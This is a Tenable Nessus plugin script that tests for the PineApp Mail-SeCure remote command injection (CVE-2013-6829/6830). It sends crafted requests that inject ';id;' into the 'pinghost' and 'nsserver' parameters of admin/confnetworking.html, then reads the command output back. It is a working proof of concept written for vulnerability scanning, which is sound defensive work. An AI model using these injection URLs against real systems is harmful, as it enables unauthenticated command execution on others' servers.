#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(71050);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/11/02 14:37:08 $");

  script_cve_id("CVE-2013-6829", "CVE-2013-6830");
  script_bugtraq_id(63817, 63834);
  script_osvdb_id(100029);
  script_xref(name:"EDB-ID", value:"29734");

  script_name(english:"PineApp Mail-SeCure admin/confnetworking.html Multiple Parameter Remote Command Injection");
  script_summary(english:"Tries to execute an arbitrary command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
remote command injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of PineApp Mail-SeCure installed on the remote host is
affected by a remote command injection vulnerability because the
application fails to properly sanitize input to multiple parameters. 
This could allow a remote, unauthenticated attacker to execute arbitrary
commands on the remote host by sending a specially crafted URL that
appends arbitrary commands to the 'nsserver' or 'pinghost' parameters of
the 'admin/confnetworking.html' script. 

Note that this application is reportedly also affected by several
additional vulnerabilities including a directory traversal, a privilege
escalation, and an authentication bypass vulnerability; however, Nessus
has not tested for those."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2013/Nov/136");
  script_set_attribute(attribute:"solution", value:"Upgrade to the latest software revision.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/11/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/11/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pineapp:mail-secure");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("pineapp_mail_secure_detect.nasl");
  script_require_ports("Services/www", 7080, 7443);
  script_require_keys("www/pineapp_mailsecure");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:7080);

install = get_install_from_kb(
  appname      : "pineapp_mailsecure",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

urls = make_list(
  "ping&type=upframe&pinghost=%27;"+cmd+";%27&pingtimes=1",
  "nslookup&hostip=&nstype=any&nsserver=127.0.0.1;"+cmd
);

foreach url (urls)
{
  attack = "/admin/confnetworking.html?cmd=" + url;
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + attack,
    exit_on_fail : TRUE
  );

  # Grab link to frame with command output
  if ( (res[0] =~ "200 OK") && ('<frame src="livelog.html' >< res[2]) )
  {
    match = eregmatch(pattern:'src="(livelog.html?(.*))"\\s+name', string:res[2]);
    if (!isnull(match)) link = match[1];
    # Fail safes we should never reach, but if so, hardcode the paths
    else
    {
      if (url =~ "nslookup") link = "livelog.html?cmd=nslookup&toolmsg=&hostip=&nstype=YW55&nsserver=MTI3LjAuMC4xO2lk";
      else link = "livelog.html?it=&cmd=ping&pinghost=';id;'&pingtimes=1";
    }

    res2 = http_send_recv3(
      method : "GET",
      port   : port,
      item   : dir + "/" + link,
      exit_on_fail : TRUE
    );

    if (egrep(pattern:cmd_pat, string:res2[2]))
    {
      if (report_verbosity > 0)
      {
        snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
        header =
        '\nNessus was able to execute the command "' + cmd + '" on the remote' +
        ' host' + '\nusing the following URL';
        trailer = '';
        if (report_verbosity > 1)
        {
          out = strstr(res2[2], "uid");
          pos = stridx(out, "<br />");
          output = substr(out, 0, pos -1);

          trailer +=
          '\nThis produced the following output :' +
          '\n' + snip +
          '\n' + output +
          '\n' + snip + '\n';
        }
        report = get_vuln_report(
          items   : dir + attack,
          port    : port,
          header  : header,
          trailer : trailer
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "PineApp Mail-SeCure", build_url(qs:dir, port:port));
